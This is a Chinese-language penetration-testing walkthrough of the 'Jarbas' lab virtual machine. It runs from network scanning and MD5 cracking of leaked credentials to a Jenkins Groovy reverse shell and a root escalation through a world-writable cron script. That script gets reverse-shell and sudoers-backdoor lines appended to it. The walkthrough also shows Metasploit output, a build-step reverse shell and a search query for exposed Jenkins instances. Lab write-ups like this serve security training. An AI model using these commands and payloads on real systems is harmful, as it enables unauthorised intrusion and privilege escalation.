VMware双击打开，nat模式运行即可！

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP
Nmap scan report for 192.168.253.236


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.236 -p- -A

22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
3306/tcp open  mysql   MariaDB (unauthorized)
8080/tcp open  http    Jetty 9.4.z-SNAPSHOT

--------------------------------------------
--------------------------------------------
3、web信息收集

访问：
http://192.168.253.236/

whatweb http://192.168.253.236/     
http://192.168.253.236/ [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], Frame, HTML5, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[192.168.253.236], Mark-of-the-Web[http://dynamicdrive.com/dynamicindex3/snow.htm], PHP[5.4.16], PasswordField[password], Script[JavaScript,javascript,text/javascript], Title[Jarbas - O Seu Mordomo Virtual!]

该站指纹情况Jarbas！

访问：
http://192.168.253.236:8080

whatweb http://192.168.253.236:8080/login?from=%2F
http://192.168.253.236:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.7c177b65], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(9.4.z-SNAPSHOT)], HttpOnly[JSESSIONID.7c177b65], IP[192.168.253.236], Jenkins[2.113], Jetty[9.4.z-SNAPSHOT], PasswordField[j_password], Prototype, Script[text/javascript], Title[Jenkins], UncommonHeaders[x-content-type-options,x-hudson-theme,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]

这是一个Jenkins控制台！

Jenkins是一个开源的、提供友好操作界面的持续集成(CI)工具，起源于Hudson（Hudson是商用的），主要用于持续、自动的构建/测试软件项目、监控外部任务的运行（这个比较抽象，暂且写上，不做解释）。Jenkins用Java语言编写，可在Tomcat等流行的servlet容器中运行，也可独立运行。通常与版本管理工具(SCM)、构建工具结合使用。常用的版本控制工具有SVN、GIT，构建工具有Maven、Ant、Gradle。

深度理解Jenkins：
https://www.jianshu.com/p/5f671aca2b5a



--------------------------------------------
--------------------------------------------
4、文件爆破

dirb http://192.168.253.236/ -w /usr/share/wordlists/dirb/big.txt -X .txt,.html

http://192.168.253.236/access.html

-------------------
Creds encrypted in a safe way!

Geoffrey

tiago:5978a63b4654c73c60fa24f836386d87
trindade:f463f63616cb3f1e81ce46b39f882fd5
eder:9b38e2b1e8b12f426b0d208a7ab6cb98
-------------------
发现三个带有用户名的密码哈希！

hash-identifier快速确认哈希确实是MD5！


--------------------------------------------
--------------------------------------------
5、md5解密

https://crackstation.net/


tiago:italia99
trindade:marianna
eder:vipsu
成功解密MD5！



--------------------------------------------
--------------------------------------------
6、getshell

访问：
http://192.168.253.236:8080
eder
vipsu


Jenkins是用于自动化SDLC生命周期的自动化服务器。Jenkins是一个非常强大的自动化工具，是许多公司常用的产品。在现实世界的pentest中看到了至少3-4个jenkins实例。

Jenkins有一个运行Groovy命令的内置脚本控制台。Apache Groovy是新一代语言，在语法上是Java的孪生兄弟。

nc -vlp 1234
--------------java-shell：
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/192.168.253.138/1234;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
-------------
成功获得反弹shell！

/bin/bash
python -c 'import pty; pty.spawn("/bin/bash")'

--------------------------------------------
--------------------------------------------
7、内部信息收集

1）Linux version 3.10.0-693
2）计划任务
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
3）0.0.0.0:3306
/usr/sbin/usernetctl
/var/cache/jenkins/war/scripts/yui/cutdown.sh


--------------------------------------------
--------------------------------------------
8、计划任务

--------------------
bash-4.2$ cat /etc/crontab
SHELL=/bin/bash
PATH=/sbin:/bin:/usr/sbin:/usr/bin
MAILTO=root

# For details see man 4 crontabs

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed
*/5 * * * * root /etc/script/CleaningScript.sh >/dev/null 2>&1
--------------------
bash-4.2$ cat /etc/script/CleaningScript.sh
#!/bin/bash

rm -rf /var/log/httpd/access_log.txt
--------------------


发现该脚本对所有用户都是可写的，写入一个反向shell命令并等待root shell！


echo "/bin/bash -i >& /dev/tcp/192.168.253.138/6666 0>&1" >> /etc/script/CleaningScript.sh

echo "echo 'jenkins ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers" >> /etc/script/CleaningScript.sh
等待五分钟！




--------------------------------------------
--------------------------------------------
9、知识拓展

方法1：MSF进攻

msfconsole
search Jenkins
use exploit/multi/http/jenkins_metaprogramming
set RHOSTS 192.168.253.236
set lhost 192.168.253.138
run

报错：
[-] Exploit aborted due to failure: not-vulnerable: The target is not exploitable. Enable ForceExploit to override check result.
开启Enable ForceExploit即可！

set forceexploit true
run

---------------------------
[*] Started HTTPS reverse handler on https://192.168.253.138:8443
[*] Executing automatic check (disable AutoCheck to override)
[!] The target is not exploitable. ForceExploit is enabled, proceeding with exploitation.
[*] Configuring Java Dropper target
[*] Using URL: http://0.0.0.0:8080/
[*] Local IP: http://192.168.253.138:8080/
[*] Sending Jenkins and Groovy go-go-gadgets
[!] https://192.168.253.138:8443 handling request from 192.168.253.236; (UUID: cgu3ggi8) Without a database connected that payload UUID tracking will not work!
[*] https://192.168.253.138:8443 handling request from 192.168.253.236; (UUID: cgu3ggi8) Staging java payload (58593 bytes) ...
[!] https://192.168.253.138:8443 handling request from 192.168.253.236; (UUID: cgu3ggi8) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (192.168.253.138:8443 -> 127.0.0.1) at 2022-05-07 02:11:16 -0400
[*] Server stopped.
[!] This exploit may require manual cleanup of '$HOME/.groovy/grapes/KossHauckandGleason' on the target

meterpreter > 
---------------------------
成功获取Meterpreter session 1 opened！


方法2：
Manage Jenkins > Configure System时，有一个Shell executable的设置！

1）New Item  ---任意输入一个用户名即可！
2）往下翻找到：Add build step > Execute Shell
3）写入：/bin/bash -i >& /dev/tcp/192.168.253.138/4444 0>&1
4）sava保存
5）kali开启：nc -vlp 4444，点击Build Now构建，等待几秒钟即可！



--------------------------------------------
--------------------------------------------
10、实战技巧

文章参考：
port="8080" && app="JENKINS" && title=="Dashboard [Jenkins]"

https://www.freebuf.com/sectool/268365.html















































































